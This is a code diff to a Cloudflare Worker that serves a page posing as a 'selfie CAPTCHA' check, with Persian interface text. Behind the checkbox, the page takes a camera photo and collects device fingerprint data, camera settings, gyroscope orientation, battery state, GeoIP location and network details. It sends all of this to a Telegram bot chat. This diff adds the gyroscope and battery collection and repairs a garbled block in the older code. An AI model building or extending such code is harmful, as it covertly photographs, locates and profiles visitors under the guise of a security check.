@@ -1,19 +1,11 @@
 // ============================================================
-//  Selfie Captcha Worker — Professional Skeleton v3
-// ============================================================
-//  Env vars (Cloudflare Dashboard → Settings → Variables):
-//    TELEGRAM_BOT_TOKEN   (required)
-//    TELEGRAM_CHAT_ID     (required)
-//    SESSION_SECRET       (optional)
-//    MAX_UPLOAD_BYTES     (optional, default 5MB)
-//    RATE_LIMIT_PER_MIN   (optional, default 5)
+//  Selfie Captcha Worker — v4 (Gyro + Battery)
 // ============================================================
 
 export default {
   async fetch(request, env, ctx) {
     try {
       const url = new URL(request.url);
-
       if (url.pathname === '/') {
         if (request.method !== 'GET') return methodNotAllowed(['GET']);
         return await handlePage(request, env);
@@ -44,7 +36,10 @@ async function handlePage(request, env) {
     'X-Content-Type-Options': 'nosniff',
     'X-Frame-Options': 'DENY',
     'Referrer-Policy': 'no-referrer',
-    'Permissions-Policy': 'camera=(self), microphone=(), geolocation=()',
+    // 🔽 NEW: اجازه سنسورها
+    'Permissions-Policy':
+      'camera=(self), microphone=(), geolocation=(), ' +
+      'accelerometer=(self), gyroscope=(self), magnetometer=(self)',
     'Content-Security-Policy': [
       "default-src 'none'",
       `script-src 'nonce-${nonce}'`,
@@ -72,17 +67,14 @@ async function handleUpload(request, env) {
   const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
   const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
 
-  // 1) rate limit
   const rl = await rateLimit(ip, Number(env.RATE_LIMIT_PER_MIN) || 5, 60);
   if (!rl.allowed) return json({ error: 'rate_limited' }, 429);
 
-  // 2) session token check
   const token = parseCookie(request.headers.get('Cookie') || '', 'hs_session');
   if (!token || !(await verifyToken(token, secret))) {
     return json({ error: 'invalid_session' }, 403);
   }
 
-  // 3) multipart
   let form;
   try {
     form = await request.formData();
@@ -99,23 +91,20 @@ async function handleUpload(request, env) {
   if (photo.size === 0) return json({ error: 'empty_photo' }, 400);
   if (photo.size > maxBytes) return json({ error: 'photo_too_large' }, 413);
   if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) {
-    return json({ error: 'invalid_mime' }, 415 =);
+    return json({ error: 'invalid_mime' }, 415); // 🔽 FIXED
   }
 
-  //  new4) client payload
-  let client DateInfo = {};
-().  try {
-   to clientInfo = JSONISO.parse(clientDataStringRaw || '{}');
- ();
-  const } catch {
-    clientInfo cam = { _parseError: 'invalid json' };
+  // 🔽 FIXED: پارس درست clientData
+  let clientInfo = {};
+  try {
+    clientInfo = JSON.parse(clientDataRaw || '{}');
+  } catch {
+    clientInfo = { _parseError: 'invalid json' };
   }
 
-  // 5) server-side info (item 9 — full GeoIP + network)
   const cf = request.cf || {};
   const serverInfo = {
     ip,
-    // location
     country: cf.country,
     countryName: cf.countryName,
     continent: cf.continent,
@@ -127,31 +116,25 @@ async function handleUpload(request, env) {
     longitude: cf.longitude,
     timezone: cf.timezone,
     isEUCountry: cf.isEUCountry,
-    // network
     isp: cf.asOrganization,
     asn: cf.asn,
     metroCode: cf.metroCode,
-    // connection
     httpProtocol: cf.httpProtocol,
     tlsVersion: cf.tlsVersion,
     tlsCipher: cf.tlsCipher,
     clientTcpRtt: cf.clientTcpRtt,
     colo: cf.colo,
-    // headers
     userAgent: request.headers.get('User-Agent'),
     acceptLanguage: request.headers.get('Accept-Language'),
     acceptEncoding: request.headers.get('Accept-Encoding'),
     referer: request.headers.get('Referer'),
-    // bot management (enterprise only)
     botScore: cf.botManagement?.score,
     verifiedBot: cf.botManagement?.verifiedBot,
   };
 
-  // 6) report
   const sessionId = crypto.randomUUID().slice(0, 8);
   const reportHtml = buildReport(sessionId, serverInfo, clientInfo);
 
-  // 7) send to Telegram
   const tg = new TelegramClient(env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID);
   const results = [];
 
@@ -194,7 +177,6 @@ class TelegramClient {
     this.chatId = chatId;
     this.base = `https://api.telegram.org/bot${token}`;
   }
-
   sendPhoto(blob, caption) {
     const fd = new FormData();
     fd.append('chat_id', this.chatId);
@@ -203,7 +185,6 @@ class TelegramClient {
     fd.append('parse_mode', 'HTML');
     return this._call('sendPhoto', fd);
   }
-
   sendMessage(text) {
     return this._call(
       'sendMessage',
@@ -216,7 +197,6 @@ class TelegramClient {
       { 'Content-Type': 'application/json' }
     );
   }
-
   sendDocument(blob, filename, caption) {
     const fd = new FormData();
     fd.append('chat_id', this.chatId);
@@ -225,7 +205,6 @@ class TelegramClient {
     fd.append('parse_mode', 'HTML');
     return this._call('sendDocument', fd);
   }
-
   async _call(method, body, headers = {}) {
     try {
       const res = await fetch(`${this.base}/${method}`, { method: 'POST', headers, body });
@@ -240,7 +219,7 @@ class TelegramClient {
 }
 
 // ============================================================
-//  Report builder (items 9 + 15 integrated)
+//  Report builder
 // ============================================================
 function buildReport(sessionId, server, client) {
   const esc = (v) =>
@@ -250,15 +229,43 @@ function buildReport(sessionId, server, client) {
       .replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;');
 
-  const when = client.camera || {};
+  // 🔽 FIXED: نام متغیرها
+  const cam = client.camera || {};
   const frame = client.capturedFrame || {};
+  const orientation = client.orientation || {};
+  const battery = client.battery || {};
   const zoom = cam.zoom;
   const iso = cam.iso;
+  const when = client.utcTime || client.localTime || new Date().toISOString();
 
   const lines = [
     `🔐 <b>گزارش سلفی</b>`,
     `<i>شناسه:</i> <code>${sessionId}</code>`,
-    `<i>زمان (UTC):</i> ${when}`,
+    `<i>زمان:</i> ${esc(when)}`,
+    ``,
+
+    // 🔽 NEW: باتری
+    `🔋 <b>وضعیت باتری</b>`,
+    battery.supported === false
+      ? `<pre>در دسترس نیست (${esc(battery.reason || battery.error || 'unsupported')})</pre>`
+      : `<pre>سطح:        ${battery.percent != null ? battery.percent + '%' : '—'}
+شارژ:       ${battery.charging === true ? 'در حال شارژ ⚡' : battery.charging === false ? 'شارژ نمی‌شود' : '—'}
+تا پر شدن:  ${fmtSeconds(battery.chargingTime)}
+تا خالی:    ${fmtSeconds(battery.dischargingTime)}</pre>`,
+    ``,
+
+    // 🔽 NEW: ژیروسکوپ / وضعیت دستگاه
+    `🧭 <b>وضعیت دستگاه (ژیروسکوپ)</b>`,
+    orientation.supported === false
+      ? `<pre>پشتیبانی نمی‌شود (${esc(orientation.reason || 'unknown')})</pre>`
+      : orientation.average
+        ? `<pre>وضعیت:      ${esc(orientation.posture || '—')}
+Alpha (Z):  ${fmtNum(orientation.average.alpha)}°
+Beta  (X):  ${fmtNum(orientation.average.beta)}°
+Gamma (Y):  ${fmtNum(orientation.average.gamma)}°
+صفحه:       ${esc(orientation.screenOrientation?.type || '—')} (${esc(orientation.screenOrientation?.angle ?? '—')}°)
+نمونه‌ها:   ${esc(orientation.sampleCount || 0)}</pre>`
+        : `<pre>داده‌ای دریافت نشد (${esc(orientation.note || 'no_data')})</pre>`,
     ``,
 
     `🌐 <b>اطلاعات شبکه</b>`,
@@ -315,6 +322,7 @@ CPU:        ${esc(client.hardwareConcurrency)} هسته
 RAM:        ${esc(client.deviceMemory)} GB
 اتصال:      ${esc(client.connectionType)}
 زمان محلی:  ${esc(client.localTime)}
+UTC:        ${esc(client.utcTime)}
 TZ:         ${esc(client.timezone)}
 آنلاین:     ${client.onLine ? 'بله' : 'خیر'}
 کوکی:       ${client.cookieEnabled ? 'بله' : 'خیر'}
@@ -326,7 +334,23 @@ PDF:        ${client.pdfViewerEnabled ? 'بله' : 'خیر'}</pre>`,
 }
 
 // ============================================================
-//  Session token (HMAC-signed timestamp)
+//  Helpers for report formatting
+// ============================================================
+// 🔽 NEW
+const fmtNum = (n, digits = 1) =>
+  typeof n === 'number' && isFinite(n) ? n.toFixed(digits) : '—';
+
+const fmtSeconds = (s) => {
+  if (typeof s !== 'number' || !isFinite(s) || s <= 0) return '—';
+  const h = Math.floor(s / 3600);
+  const m = Math.floor((s % 3600) / 60);
+  if (h > 0) return `${h} ساعت ${m} دقیقه`;
+  if (m > 0) return `${m} دقیقه`;
+  return `${Math.floor(s)} ثانیه`;
+};
+
+// ============================================================
+//  Session token / rate limit / utils (بدون تغییر)
 // ============================================================
 async function issueToken(secret) {
   const ts = String(Date.now());
@@ -334,7 +358,6 @@ async function issueToken(secret) {
   const sig = await hmac(payload, secret);
   return `${payload}.${sig}`;
 }
-
 async function verifyToken(token, secret, maxAgeMs = 5 * 60_000) {
   try {
     const [payload, sig] = String(token).split('.');
@@ -352,7 +375,6 @@ async function verifyToken(token, secret, maxAgeMs = 5 * 60_000) {
     return false;
   }
 }
-
 async function hmac(data, secret) {
   const key = await crypto.subtle.importKey(
     'raw',
@@ -367,10 +389,6 @@ async function hmac(data, secret) {
     .replace(/\//g, '_')
     .replace(/=+$/, '');
 }
-
-// ============================================================
-//  Rate limit (Cache API, per-colo)
-// ============================================================
 async function rateLimit(ip, limit, windowSec) {
   const cache = caches.default;
   const key = new Request(`https://ratelimit.local/${encodeURIComponent(ip)}`);
@@ -385,10 +403,6 @@ async function rateLimit(ip, limit, windowSec) {
   );
   return { allowed: true, remaining: limit - count - 1 };
 }
-
-// ============================================================
-//  Utilities
-// ============================================================
 function parseCookie(header, name) {
   for (const part of header.split(';')) {
     const [k, ...rest] = part.trim().split('=');
@@ -396,7 +410,6 @@ function parseCookie(header, name) {
   }
   return null;
 }
-
 function chunkByLines(text, size = 4000) {
   const out = [];
   let current = '';
@@ -411,7 +424,6 @@ function chunkByLines(text, size = 4000) {
   if (current) out.push(current);
   return out;
 }
-
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 const json = (obj, status = 200) =>
   new Response(JSON.stringify(obj), {
@@ -451,8 +463,7 @@ function renderHTML(nonce) {
   .checkbox {
     width: 28px; height: 28px; border: 2px solid #9ca3af; border-radius: 6px;
     display: flex; align-items: center; justify-content: center;
-    cursor: pointer; background: #fff; transition: all .18s ease;
-    flex-shrink: 0;
+    cursor: pointer; background: #fff; transition: all .18s ease; flex-shrink: 0;
   }
   .checkbox:hover { border-color: var(--accent); }
   .checkbox:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
@@ -529,7 +540,6 @@ function renderHTML(nonce) {
     el.status.className = 'status';
     el.status.textContent = message || '';
     el.retry.style.display = 'none';
-
     if (state === 'busy') {
       el.box.classList.add('busy');
       el.label.textContent = 'در حال بررسی...';
@@ -570,16 +580,13 @@ function renderHTML(nonce) {
     });
   }
 
-  // ---------- item 15: camera info ----------
   async function collectCameraInfo(stream) {
     const info = {};
     const track = stream.getVideoTracks()[0];
     if (!track) return info;
-
     try {
       const s = track.getSettings?.() || {};
       const c = track.getCapabilities?.() || {};
-
       info.deviceId = s.deviceId;
       info.groupId = s.groupId;
       info.facingMode = s.facingMode;
@@ -591,7 +598,6 @@ function renderHTML(nonce) {
       info.focusMode = s.focusMode;
       info.exposureMode = s.exposureMode;
       info.whiteBalanceMode = s.whiteBalanceMode;
-
       info.supportedFacingModes = c.facingMode || [];
       info.supportedFocusModes = c.focusMode || [];
       info.hasTorch = !!c.torch;
@@ -604,12 +610,10 @@ function renderHTML(nonce) {
       info.contrast = c.contrast ? { min: c.contrast.min, max: c.contrast.max } : null;
       info.saturation = c.saturation ? { min: c.saturation.min, max: c.saturation.max } : null;
       info.sharpness = c.sharpness ? { min: c.sharpness.min, max: c.sharpness.max } : null;
-
       info.requestedConstraints = track.getConstraints?.() || null;
     } catch (e) {
       info._settingsError = String(e);
     }
-
     try {
       const devices = await navigator.mediaDevices.enumerateDevices();
       info.videoDeviceCount = devices.filter((d) => d.kind === 'videoinput').length;
@@ -620,13 +624,135 @@ function renderHTML(nonce) {
     } catch (e) {
       info._enumerateError = String(e);
     }
-
     return info;
   }
 
-  // ---------- general client data ----------
+  // 🔽 NEW: مجوز ژیروسکوپ (iOS 13+)
+  async function requestOrientationPermission() {
+    try {
+      if (typeof DeviceOrientationEvent === 'undefined') {
+        return { available: false, reason: 'unsupported' };
+      }
+      if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+        const state = await DeviceOrientationEvent.requestPermission();
+        return { available: state === 'granted', reason: state };
+      }
+      return { available: true, reason: 'no_permission_needed' };
+    } catch (e) {
+      return { available: false, reason: String(e && e.message || e) };
+    }
+  }
+
+  // 🔽 NEW: نمونه‌برداری از ژیروسکوپ
+  async function collectOrientation(sampleMs = 500) {
+    const result = {
+      supported: typeof DeviceOrientationEvent !== 'undefined',
+      samples: [],
+    };
+
+    // وضعیت صفحه — بدون نیاز به مجوز، قابل اعتماد
+    try {
+      if (screen.orientation) {
+        result.screenOrientation = {
+          type: screen.orientation.type,
+          angle: screen.orientation.angle,
+        };
+      } else if (typeof window.orientation !== 'undefined') {
+        result.screenOrientation = { angle: window.orientation };
+      }
+    } catch (e) {
+      result._screenOrientationError = String(e);
+    }
+
+    if (!result.supported) return result;
+
+    const collected = [];
+    const listener = (ev) => {
+      collected.push({
+        alpha: typeof ev.alpha === 'number' ? ev.alpha : null,
+        beta: typeof ev.beta === 'number' ? ev.beta : null,
+        gamma: typeof ev.gamma === 'number' ? ev.gamma : null,
+        absolute: ev.absolute === true,
+      });
+    };
+    window.addEventListener('deviceorientation', listener);
+    await new Promise((r) => setTimeout(r, sampleMs));
+    window.removeEventListener('deviceorientation', listener);
+
+    const valid = collected.filter(
+      (s) => s.alpha != null || s.beta != null || s.gamma != null
+    );
+    if (valid.length === 0) {
+      result.note = 'no_events_received';
+      return result;
+    }
+
+    const avgOf = (key) => {
+      const v = valid.map((s) => s[key]).filter((n) => typeof n === 'number');
+      return v.length ? v.reduce((a, b) => a + b, 0) / v.length : null;
+    };
+    result.average = {
+      alpha: avgOf('alpha'),
+      beta: avgOf('beta'),
+      gamma: avgOf('gamma'),
+    };
+    result.sampleCount = valid.length;
+    result.absolute = valid.some((s) => s.absolute);
+    result.posture = classifyPosture(result.average, result.screenOrientation);
+    return result;
+  }
+
+  // 🔽 NEW: تفسیر وضعیت دستگاه
+  function classifyPosture(avg, screenOrient) {
+    if (avg.beta == null && avg.gamma == null) return 'unknown';
+    const beta = avg.beta ?? 0;
+    const gamma = avg.gamma ?? 0;
+    const absB = Math.abs(beta);
+    const parts = [];
+
+    // front/back tilt
+    if (absB < 20) parts.push('افقی (تخت)');
+    else if (absB < 70) parts.push(beta > 0 ? 'کمی رو به جلو' : 'کمی رو به عقب');
+    else if (absB < 110) parts.push('عمودی');
+    else parts.push('رو به پایین');
+
+    // left/right tilt
+    if (gamma > 25) parts.push('کج به راست');
+    else if (gamma < -25) parts.push('کج به چپ');
+
+    // screen orientation
+    const t = screenOrient && screenOrient.type;
+    if (t) {
+      if (t.indexOf('portrait') === 0) parts.push('صفحه عمودی');
+      else if (t.indexOf('landscape') === 0) parts.push('صفحه افقی');
+    }
+
+    return parts.join(' • ') || 'صاف';
+  }
+
+  // 🔽 NEW: باتری
+  async function collectBattery() {
+    const out = { supported: typeof navigator.getBattery === 'function' };
+    if (!out.supported) {
+      out.reason = 'api_unsupported';
+      return out;
+    }
+    try {
+      const b = await navigator.getBattery();
+      out.level = b.level;
+      out.percent = Math.round(b.level * 100);
+      out.charging = !!b.charging;
+      out.chargingTime = Number.isFinite(b.chargingTime) ? b.chargingTime : null;
+      out.dischargingTime = Number.isFinite(b.dischargingTime) ? b.dischargingTime : null;
+    } catch (e) {
+      out.error = String(e && e.message || e);
+    }
+    return out;
+  }
+
   function collectClientData() {
     const c = navigator.connection || {};
+    const now = new Date();
     return {
       userAgent: navigator.userAgent,
       language: navigator.language,
@@ -642,7 +768,8 @@ function renderHTML(nonce) {
       onLine: navigator.onLine,
       connectionType: c.effectiveType || null,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      localTime: new Date().toLocaleString(),
+      localTime: now.toLocaleString(),
+      utcTime: now.toISOString(),
       cookieEnabled: navigator.cookieEnabled,
       doNotTrack: navigator.doNotTrack,
       pdfViewerEnabled: navigator.pdfViewerEnabled,
@@ -654,6 +781,10 @@ function renderHTML(nonce) {
     busy = true;
     setState('busy');
 
+    // 🔽 NEW — اول از همه: درخواست مجوز ژیروسکوپ
+    // (باید داخل هندلر کلیک و قبل از هر await دیگری باشد)
+    const orientationPerm = await requestOrientationPermission();
+
     let stream = null;
     try {
       stream = await getCameraStream();
@@ -661,7 +792,6 @@ function renderHTML(nonce) {
       await waitForVideo(el.video);
       await new Promise((r) => setTimeout(r, 350));
 
-      // 🔽 capture camera info BEFORE stopping stream
       const camInfo = await collectCameraInfo(stream);
 
       el.canvas.width = el.video.videoWidth || 640;
@@ -680,15 +810,30 @@ function renderHTML(nonce) {
       stream.getTracks().forEach((t) => t.stop());
       stream = null;
 
+      // 🔽 NEW: ژیروسکوپ + باتری به‌صورت موازی
+      const [orientation, battery] = await Promise.all([
+        orientationPerm.available
+          ? collectOrientation()
+          : Promise.resolve({ supported: false, reason: orientationPerm.reason }),
+        collectBattery(),
+      ]);
+
       const clientData = collectClientData();
       clientData.camera = camInfo;
       clientData.capturedFrame = captured;
+      clientData.orientation = orientation;               // 🔽 NEW
+      clientData.orientationPermission = orientationPerm; // 🔽 NEW
+      clientData.battery = battery;                       // 🔽 NEW
 
       const fd = new FormData();
       fd.append('photo', blob, 'selfie.jpg');
       fd.append('clientData', JSON.stringify(clientData));
 
-      const resp = await fetch('/upload', { method: 'POST', body: fd, credentials: 'same-origin' });
+      const resp = await fetch('/upload', {
+        method: 'POST',
+        body: fd,
+        credentials: 'same-origin',
+      });
       if (!resp.ok) {
         let detail = '';
         try { detail = (await resp.json()).error || ''; } catch {}
@@ -703,7 +848,7 @@ function renderHTML(nonce) {
         CAM_ERRORS[name] ||
         (err && err.message === 'camera_timeout'
           ? 'زمان انتظار برای دوربین به پایان رسید.'
-          : err && err.message && err.message.startsWith('upload_failed')
+          : err && err.message && err.message.indexOf('upload_failed') === 0
           ? 'ارسال اطلاعات ناموفق بود. لطفاً دوباره تلاش کنید.'
           : 'خطایی رخ داد. لطفاً دوباره تلاش کنید.');
       setState('error', msg);
